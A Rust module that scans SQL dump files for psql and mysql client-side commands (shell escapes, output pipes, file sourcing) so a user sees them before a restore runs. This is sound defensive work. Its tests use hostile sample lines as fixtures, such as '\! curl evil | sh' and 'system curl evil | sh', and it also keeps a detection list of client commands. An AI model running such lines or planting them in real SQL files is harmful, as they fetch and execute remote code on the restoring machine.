//! The commands of a SQL file meant for the client that runs it rather than for the server:
//! psql's backslash commands (`\!`, `\o |…`, `\copy … program`, `\connect`…) and the mysql
//! client's (`system`, `source`, `\!`…). Restoring a file runs them on this computer, so they
//! are found before, and the file is restored only once the user has seen them.
//!
//! The scan follows the client's own reading of quotes, comments and `COPY` data. Where the
//! reading depends on the server (psql's `standard_conforming_strings`, MySQL's
//! `NO_BACKSLASH_ESCAPES`, which the file itself can change), the file is read both ways and
//! a command found either way counts.

use std::io::BufRead;

/// The client a file is restored through.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(super) enum Client {
    Psql,
    Mysql,
}

/// A line of the file with a client command: its number, from 1, and its text.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(super) struct Found {
    pub line: usize,
    pub text: String,
}

/// The lines given at most: enough to judge the file.
const MAX_FOUND: usize = 20;
/// The characters of a line shown.
const MAX_TEXT: usize = 200;
/// The text of a statement kept to tell a `COPY … FROM stdin`.
const MAX_STATEMENT: usize = 64 * 1024;

/// The lines of `reader` with commands for `client`, the first [`MAX_FOUND`].
pub(super) fn client_commands(
    mut reader: impl BufRead,
    client: Client,
) -> std::io::Result<Vec<Found>> {
    let mut readers: [Box<dyn Lexer>; 2] = match client {
        Client::Psql => [Box::new(Psql::new(true)), Box::new(Psql::new(false))],
        Client::Mysql => [Box::new(Mysql::new(true)), Box::new(Mysql::new(false))],
    };
    let mut found = Vec::new();
    let mut line = Vec::new();
    let mut number = 0;
    while found.len() < MAX_FOUND {
        line.clear();
        if reader.read_until(b'\n', &mut line)? == 0 {
            break;
        }
        number += 1;
        let text = trim_end(&line);
        // Both readings go on to the end, each with its own state.
        let mut hit = false;
        for lexer in &mut readers {
            hit |= lexer.line(text);
        }
        if hit {
            let shown: String = String::from_utf8_lossy(text)
                .chars()
                .take(MAX_TEXT)
                .collect();
            found.push(Found {
                line: number,
                text: shown,
            });
        }
    }
    Ok(found)
}

fn trim_end(line: &[u8]) -> &[u8] {
    let mut end = line.len();
    while end > 0 && matches!(line[end - 1], b'\n' | b'\r') {
        end -= 1;
    }
    &line[..end]
}

/// One reading of a file, a line at a time: whether the line has a client command.
trait Lexer {
    fn line(&mut self, line: &[u8]) -> bool;
}

fn is_ident(c: u8) -> bool {
    c.is_ascii_alphanumeric() || c == b'_' || c >= 0x80
}

/// `pg_dump`'s own `\restrict KEY` and `\unrestrict KEY`: they only take commands away.
pub(super) fn is_restrict_line(line: &[u8]) -> bool {
    let line = trim_end(line);
    let rest = line
        .strip_prefix(b"\\restrict ")
        .or_else(|| line.strip_prefix(b"\\unrestrict "));
    rest.is_some_and(|key| !key.is_empty() && key.iter().all(u8::is_ascii_alphanumeric))
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum PgState {
    Normal,
    /// A string; `escape` when a backslash escapes the next character.
    Quote {
        escape: bool,
    },
    Ident,
    /// A dollar-quoted string, with its tag (`$body$`).
    Dollar(Vec<u8>),
    Block(u32),
}

/// psql's reading, with `standard_conforming_strings` on or off.
struct Psql {
    standard: bool,
    state: PgState,
    /// The statement so far, outside quotes and comments, in lower case.
    statement: Vec<u8>,
    /// The lines are the data of a `COPY … FROM stdin`, up to `\.`.
    copy_data: bool,
}

impl Psql {
    fn new(standard: bool) -> Self {
        Self {
            standard,
            state: PgState::Normal,
            statement: Vec::new(),
            copy_data: false,
        }
    }

    fn push(&mut self, c: u8) {
        if self.statement.len() < MAX_STATEMENT {
            self.statement.push(c.to_ascii_lowercase());
        }
    }

    /// The statement ended is a `COPY … FROM stdin`, whose data follows from the next line.
    fn copies_from_stdin(&self) -> bool {
        let words: Vec<&[u8]> = self
            .statement
            .split(u8::is_ascii_whitespace)
            .filter(|w| !w.is_empty())
            .collect();
        words.first() == Some(&&b"copy"[..])
            && words
                .windows(2)
                .any(|w| w[0] == b"from" && w[1] == b"stdin")
    }

    /// The tag of a dollar quote starting at `i`, `$` to `$`.
    fn dollar_tag(line: &[u8], i: usize) -> Option<Vec<u8>> {
        if i > 0 && is_ident(line[i - 1]) {
            return None;
        }
        let mut end = i + 1;
        while end < line.len() && is_ident(line[end]) {
            end += 1;
        }
        let tag = &line[i + 1..end];
        let starts_well = tag.first().is_none_or(|c| !c.is_ascii_digit());
        (line.get(end) == Some(&b'$') && starts_well).then(|| line[i..=end].to_vec())
    }
}

impl Lexer for Psql {
    fn line(&mut self, line: &[u8]) -> bool {
        if self.copy_data {
            if line == b"\\." {
                self.copy_data = false;
            }
            return false;
        }
        let at_start =
            self.state == PgState::Normal && self.statement.iter().all(u8::is_ascii_whitespace);
        if at_start && is_restrict_line(line) {
            return false;
        }
        let mut copy_follows = false;
        let mut i = 0;
        while i < line.len() {
            if let PgState::Dollar(tag) = &self.state {
                let Some(at) = line[i..].windows(tag.len()).position(|w| w == tag) else {
                    break;
                };
                i += at + tag.len();
                self.state = PgState::Normal;
                continue;
            }
            let c = line[i];
            let next = line.get(i + 1).copied();
            match self.state {
                PgState::Normal => match c {
                    b'-' if next == Some(b'-') => break,
                    b'/' if next == Some(b'*') => {
                        self.state = PgState::Block(1);
                        i += 1;
                    }
                    b'\'' => {
                        let prefixed = i > 0
                            && matches!(line[i - 1], b'e' | b'E')
                            && (i < 2 || !is_ident(line[i - 2]));
                        self.state = PgState::Quote {
                            escape: prefixed || !self.standard,
                        };
                        self.push(b' ');
                    }
                    b'"' => self.state = PgState::Ident,
                    b'$' => match Self::dollar_tag(line, i) {
                        Some(tag) => {
                            i += tag.len() - 1;
                            self.state = PgState::Dollar(tag);
                        }
                        None => self.push(c),
                    },
                    // A meta-command: psql takes the rest of the line as its arguments.
                    b'\\' => return true,
                    b';' => {
                        copy_follows = self.copies_from_stdin();
                        self.statement.clear();
                    }
                    _ => self.push(c),
                },
                PgState::Quote { escape } => match c {
                    b'\\' if escape => i += 1,
                    b'\'' if next == Some(b'\'') => i += 1,
                    b'\'' => self.state = PgState::Normal,
                    _ => {}
                },
                PgState::Ident => match c {
                    b'"' if next == Some(b'"') => i += 1,
                    b'"' => self.state = PgState::Normal,
                    _ => {}
                },
                // Taken above.
                PgState::Dollar(_) => {}
                PgState::Block(depth) => {
                    if c == b'/' && next == Some(b'*') {
                        self.state = PgState::Block(depth + 1);
                        i += 1;
                    } else if c == b'*' && next == Some(b'/') {
                        self.state = if depth == 1 {
                            PgState::Normal
                        } else {
                            PgState::Block(depth - 1)
                        };
                        i += 1;
                    }
                }
            }
            i += 1;
        }
        self.push(b' ');
        self.copy_data = copy_follows;
        false
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum MyState {
    Normal,
    /// A string or a quoted name, by its quote.
    Quote(u8),
    Block,
}

/// The mysql client's long commands that reach outside the server: programs, files, other
/// servers. The others (`use`, `delimiter`, `charset`…) stay inside the session.
const MYSQL_COMMANDS: [&[u8]; 6] = [b"system", b"source", b"tee", b"pager", b"edit", b"connect"];

/// The mysql client's reading, with backslashes escaping in strings or not
/// (`NO_BACKSLASH_ESCAPES`).
struct Mysql {
    escapes: bool,
    state: MyState,
}

impl Mysql {
    fn new(escapes: bool) -> Self {
        Self {
            escapes,
            state: MyState::Normal,
        }
    }
}

/// Whether `line` starts with one of the client's long commands that reach outside.
fn mysql_long_command(line: &[u8]) -> bool {
    let start = line.iter().position(|c| !c.is_ascii_whitespace());
    let Some(start) = start else {
        return false;
    };
    let rest = &line[start..];
    let end = rest
        .iter()
        .position(|c| !c.is_ascii_alphabetic())
        .unwrap_or(rest.len());
    let word = rest[..end].to_ascii_lowercase();
    let after = rest.get(end).copied();
    MYSQL_COMMANDS.contains(&word.as_slice())
        && after.is_none_or(|c| c.is_ascii_whitespace() || c == b';')
}

impl Lexer for Mysql {
    fn line(&mut self, line: &[u8]) -> bool {
        if self.state == MyState::Normal && mysql_long_command(line) {
            return true;
        }
        let mut i = 0;
        while i < line.len() {
            let c = line[i];
            let next = line.get(i + 1).copied();
            match self.state {
                MyState::Normal => match c {
                    b'#' => break,
                    b'-' if next == Some(b'-')
                        && line.get(i + 2).is_none_or(u8::is_ascii_whitespace) =>
                    {
                        break;
                    }
                    // `/*!…*/` holds statements, not a comment.
                    b'/' if next == Some(b'*') && line.get(i + 2) != Some(&b'!') => {
                        self.state = MyState::Block;
                        i += 1;
                    }
                    b'\'' | b'"' | b'`' => self.state = MyState::Quote(c),
                    // `\N` is NULL; any other is a command.
                    b'\\' if next != Some(b'N') => return true,
                    _ => {}
                },
                MyState::Quote(q) => {
                    // An escaped character, or the quote doubled, stays inside.
                    let escaped = c == b'\\' && q != b'`' && self.escapes;
                    if escaped || (c == q && next == Some(q)) {
                        i += 1;
                    } else if c == q {
                        self.state = MyState::Normal;
                    }
                }
                MyState::Block => {
                    if c == b'*' && next == Some(b'/') {
                        self.state = MyState::Normal;
                        i += 1;
                    }
                }
            }
            i += 1;
        }
        false
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn lines(text: &str, client: Client) -> Vec<usize> {
        client_commands(text.as_bytes(), client)
            .unwrap()
            .into_iter()
            .map(|f| f.line)
            .collect()
    }

    #[test]
    fn a_pg_dump_has_no_command_of_psql() {
        let dump = "\\restrict abc123\n\
            SET standard_conforming_strings = on;\n\
            CREATE FUNCTION f() RETURNS text AS $body$ SELECT '\\! not run' $body$ LANGUAGE sql;\n\
            -- \\! a comment\n\
            /* \\! a /* nested */ comment */\n\
            COPY public.t (id, v) FROM stdin;\n\
            1\t\\N\n\
            \\! data, not a command\n\
            \\.\n\
            INSERT INTO t VALUES (1, 'C:\\dir', \"col\\x\");\n\
            SELECT $1, a$b FROM t;\n\
            \\unrestrict abc123\n";
        assert_eq!(lines(dump, Client::Psql), Vec::<usize>::new());
    }

    #[test]
    fn finds_the_commands_of_psql() {
        let file = "SELECT 1;\n\
            \\! curl evil | sh\n\
            SELECT 2; \\o |cat\n\
            \\copy t to program 'sh'\n\
            SELECT E'it\\'s' \\gexec\n\
            \\connect other\n\
            \\restrict not-a-key\n";
        assert_eq!(lines(file, Client::Psql), [2, 3, 4, 5, 6, 7]);
    }

    #[test]
    fn reads_strings_both_ways() {
        // With standard_conforming_strings off, `'\'` does not end the string: the command
        // is outside it. Read as standard, it seems inside; either reading counts.
        let file = "SET standard_conforming_strings = off;\nSELECT '\\' ' \\! evil';\n";
        assert_eq!(lines(file, Client::Psql), [2]);
        // And the other way round.
        let file = "SELECT 'a\\' \\! evil '; \n";
        assert_eq!(lines(file, Client::Psql), [1]);
    }

    #[test]
    fn finds_the_commands_of_mysql() {
        let file = "USE `shop`;\n\
            DELIMITER ;;\n\
            /*!50003 CREATE PROCEDURE p() BEGIN SELECT 'system x'; END */;;\n\
            DELIMITER ;\n\
            INSERT INTO t VALUES ('a\\'b', \"\\! no\", \\N);\n\
            -- system not run\n\
            # \\! not run\n\
            /* source not run */\n\
            system curl evil | sh\n\
            SOURCE /tmp/x.sql\n\
            select 1; \\! ls\n\
            tee /tmp/out\n\
            systems are fine\n";
        assert_eq!(lines(file, Client::Mysql), [9, 10, 11, 12]);
    }

    #[test]
    fn tells_pg_dumps_restrict_lines() {
        assert!(is_restrict_line(b"\\restrict Ab12\r\n"));
        assert!(is_restrict_line(b"\\unrestrict Ab12"));
        assert!(!is_restrict_line(b"\\restrict"));
        assert!(!is_restrict_line(b"\\restrict a b"));
        assert!(!is_restrict_line(b"\\! restrict x"));
    }

    #[test]
    fn gives_the_first_lines_only() {
        let file = "\\! x\n".repeat(50);
        let found = client_commands(file.as_bytes(), Client::Psql).unwrap();
        assert_eq!(found.len(), MAX_FOUND);
        assert_eq!(found[0].text, "\\! x");
    }
}
